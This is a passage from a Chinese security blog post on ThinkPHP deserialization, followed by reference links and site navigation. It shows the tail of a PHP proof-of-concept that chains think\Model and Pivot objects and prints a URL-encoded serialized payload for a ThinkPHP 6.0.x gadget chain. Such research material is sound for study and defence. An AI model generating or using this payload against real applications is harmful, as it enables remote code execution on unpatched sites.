$connection=<span class="string">'mysql'</span>;</span><br><span class="line">    <span class="keyword">protected</span> $name;</span><br><span class="line">    <span class="keyword">protected</span> $suffix = <span class="string">''</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;get();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;lazySave = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;withEvent = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;exists = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;force = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;field = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;schema = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connection = <span class="string">'mysql'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($obj=<span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::__construct();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Pivot();</span><br><span class="line">$b = <span class="keyword">new</span> Pivot($a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br></pre></td></tr></table></figure>

<p><a href="https://www.freebuf.com/column/221939.html" target="_blank" rel="noopener">https://www.freebuf.com/column/221939.html</a></p>
<p><a href="https://zhzhdoai.github.io/2019/10/02/ThinkPHP-6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9/" target="_blank" rel="noopener">https://zhzhdoai.github.io/2019/10/02/ThinkPHP-6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9/</a></p>

            


        </div>
    </div>
    <div id="post-footer" class="post-footer main-content-wrap">
        
        
            <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    
                <a
                    class="post-action-btn btn btn--default tooltip--top"
                    href="/2019/11/17/运算符的巧妙利用/"
                    data-tooltip="运算符的巧妙利用"
                    aria-label="上一篇: 运算符的巧妙利用"
                >
                    
                        <i class="fa fa-angle-left" aria-hidden="true"></i>
                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
                    </a>
            </li>
            <li class="post-action">
                
                    
                <a
                    class="post-action-btn btn btn--default tooltip--top"
                    href="/2019/11/08/MySql字符研究/"
                    data-tooltip="MySql字符研究"
                    aria-label="下一篇: MySql字符研究"
                >
                    
                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
                        <i class="fa fa-angle-right" aria-hidden="true"></i>
                    </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a
                class="post-action-btn btn btn--default btn-open-shareoptions"
                href="#btn-open-shareoptions"
                aria-label="Share this post"
            >
                <i class="fa fa-share-alt" aria-hidden="true"></i>
            </a>
        </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/11/13/thinkphp反序列化/"
                    title="分享到 Facebook"
                    aria-label="分享到 Facebook"
                >
                    <i class="fab fa-facebook" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/11/13/thinkphp反序列化/"
                    title="分享到 Twitter"
                    aria-label="分享到 Twitter"
                >
                    <i class="fab fa-twitter" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/11/13/thinkphp反序列化/"
                    title="分享到 Google+"
                    aria-label="分享到 Google+"
                >
                    <i class="fab fa-google-plus" aria-hidden="true"></i>
                </a>
            </li>
        
        
            
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
            
                <i class="fa fa-list" aria-hidden="true"></i>
            </a>
        </li>
    </ul>
</div>


        
        
            
        
    </div>
</article>



                <footer id="footer" class="main-content-wrap">
    <span class="copyrights">
        Copyrights &copy; 2020 John Doe. All Rights Reserved.
    </span>
</footer>

            </div>
            
                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
                    <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    
                <a
                    class="post-action-btn btn btn--default tooltip--top"
                    href="/2019/11/17/运算符的巧妙利用/"
                    data-tooltip="运算符的巧妙利用"
                    aria-label="上一篇: 运算符的巧妙利用"
                >
                    
                        <i class="fa fa-angle-left" aria-hidden="true"></i>
                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
                    </a>
            </li>
            <li class="post-action">
                
                    
                <a
                    class="post-action-btn btn btn--default tooltip--top"
                    href="/2019/11/08/MySql字符研究/"
                    data-tooltip="MySql字符研究"
                    aria-label="下一篇: MySql字符研究"
                >
                    
                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
                        <i class="fa fa-angle-right" aria-hidden="true"></i>
                    </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a
                class="post-action-btn btn btn--default btn-open-shareoptions"
                href="#btn-open-shareoptions"
                aria-label="Share this post"
            >
                <i class="fa fa-share-alt" aria-hidden="true"></i>
            </a>
        </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/11/13/thinkphp反序列化/"
                    title="分享到 Facebook"
                    aria-label="分享到 Facebook"
                >
                    <i class="fab fa-facebook" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/11/13/thinkphp反序列化/"
                    title="分享到 Twitter"
                    aria-label="分享到 Twitter"
                >
                    <i class="fab fa-twitter" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/11/13/thinkphp反序列化/"
                    title="分享到 Google+"
                    aria-label="分享到 Google+"
                >
                    <i class="fab fa-google-plus" aria-hidden="true"></i>
                </a>
            </li>
        
        
            
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
            
                <i class="fa fa-list" aria-hidden="true"></i>
            </a>
        </li>
    </ul>
</div>


                </div>
                
    <div id="share-options-bar" class="share-options-bar" data-behavior="4">
        <i id="btn-close-shareoptions" class="fa fa-times"></i>
        <ul class="share-options">
            
                
                
                <li class="share-option">
                    <a
                        class="share-option-btn"
                        target="new"
                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/11/13/thinkphp反序列化/"
                        aria-label="分享到 Facebook"
                    >
                        <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
                    </a>
                </li>
            
                
                
                <li class="share-option">
                    <a
                        class="share-option-btn"
                        target="new"
                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/11/13/thinkphp反序列化/"
                        aria-label="分享到 Twitter"
                    >
                        <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
                    </a>
                </li>
            
                
                
                <li class="share-option">
                    <a
                        class="share-option-btn"
                        target="new"
                        href="https://plus.google.com/share?url=http://yoursite.com/2019/11/13/thinkphp反序列化/"
                        aria-label="分享到 Google+"
                    >
                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
                    </a>
                </li>
            
        </ul>
    </div>


            
        </div>
        


<div id="about">
    <div id="about-card">
        <div id="about-btn-close">
            <i class="fa fa-times"></i>
        </div>
        
            <h4 id="about-card-name">John Doe</h4>
        
            <div id="about-card-bio"><p>author.bio</p>
</div>
        
        
            <div id="about-card-job">
                <i class="fa fa-briefcase"></i>
                <br/>
                <p>author.job</p>

            </div>
        
        
    </div>
</div>

        
        
<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
        <!--SCRIPTS-->
<script src="/assets/js/script-hvks0tjho7hhxxjwgvjgerqzsheh4pu8sgih6uruqsx2fdeiyiflclfy2v4q.min.js"></script>
<!--SCRIPTS END-->


    




    </body>
</html>
